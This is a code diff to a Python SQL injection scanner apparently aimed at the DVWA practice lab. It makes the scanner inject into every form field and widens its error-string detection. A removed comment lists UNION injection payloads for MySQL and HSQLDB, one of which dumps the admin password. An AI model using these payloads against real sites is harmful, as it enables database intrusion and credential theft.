@@ -86,7 +86,10 @@ def is_vulnerable(response):
         "data exception: invalid",
         ": unexpected token",
         ": unknown token",
-        "null",
+        "unknown table",
+        "unexpected token: dbms",
+        '"output" : null',
+        "feedback-negative'>unknown token",
     }
     for error in errors:
         if error in response.content.decode().lower():
@@ -101,6 +104,7 @@ def check_form(url):
         for c in "\"'":
             # Get data to submit
             data = {}
+            keys = []
             for input_tag in form_details["inputs"]:
                 if input_tag["value"] or input_tag["type"] == "hidden":
                     try:
@@ -108,6 +112,8 @@ def check_form(url):
                     except:
                         pass
                 elif input_tag["type"] != "submit":
+                    if input_tag["name"] != "user_token":
+                        keys.append(input_tag["name"])
                     data[input_tag["name"]] = f"test{c}"
             # Get url to submit data
             url = urljoin(url, form_details["action"])
@@ -119,8 +125,8 @@ def check_form(url):
             if is_vulnerable(res):
                 vulnerable = True
                 print("\nSQL Injection vulnerability detected in:\n\t", url)
-                ## TODO hardcode
-                check_injections(url, data, "id", form_details["method"].upper())
+                for k in keys:
+                    check_injections(url, data, k, form_details["method"].upper())
                 # print("data:")
                 # pprint(data)
     if not vulnerable:
@@ -159,13 +165,9 @@ def check_injections(url, data, key, method):
     check_list_injections(url, data, key, method, injections["string"])
     print("\tTrying UNION type injections")
     print("\t- mysql/mariadb numeric:")
-    found = False
-    if check_list_injections(url, data, key, method, injections["mysql_num"]):
-        found = True
+    check_list_injections(url, data, key, method, injections["mysql_num"])
     print("\t- mysql/mariadb string:")
-    if check_list_injections(url, data, key, method, injections["mysql_str"]):
-        found = True
-    # if found: return
+    check_list_injections(url, data, key, method, injections["mysql_str"])
     print("\t- hsqldb numeric:")
     check_list_injections(url, data, key, method, injections["hsqldb_num"])
     print("\t- hsqldb string:")
@@ -192,23 +194,6 @@ def check_list_injections(url, data, key, method, injects):
     print("\t[-] Nope")
     return False
 
-
-'''
-MySQL
-https://portswigger.net/web-security/sql-injection/examining-the-database
-' UNION SELECT NULL, @@version; -- 
-' UNION SELECT table_catalog,table_name FROM information_schema.tables; -- 
-' UNION SELECT table_name,column_name FROM information_schema.columns; -- 
-
-HSQLDB
-select character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'
-
-' union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- 
-' union select null,null,null,null,null,'hola'||table_name||'hola' from information_schema.tables; -- 
-' union select null,null,null,null,null,'hola'||column_name||'hola' from information_schema.columns; -- 
-
-2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||','||username||','||password FROM users WHERE username='admin')
-'''
 
 def download_info(url="http://localhost/vulnerabilities/sqli/"):
     '''Only work with 'dvwa': http://localhost/vulnerabilities/sqli/
@@ -313,7 +298,7 @@ def main():
         parse_cookies(args.cookie)
 
     if (args.dump):
-        save_info(download_info(), args.o)
+        save_info(download_info(args.url), args.o)
     elif (args.forms):
         check_form(args.url)
     else:
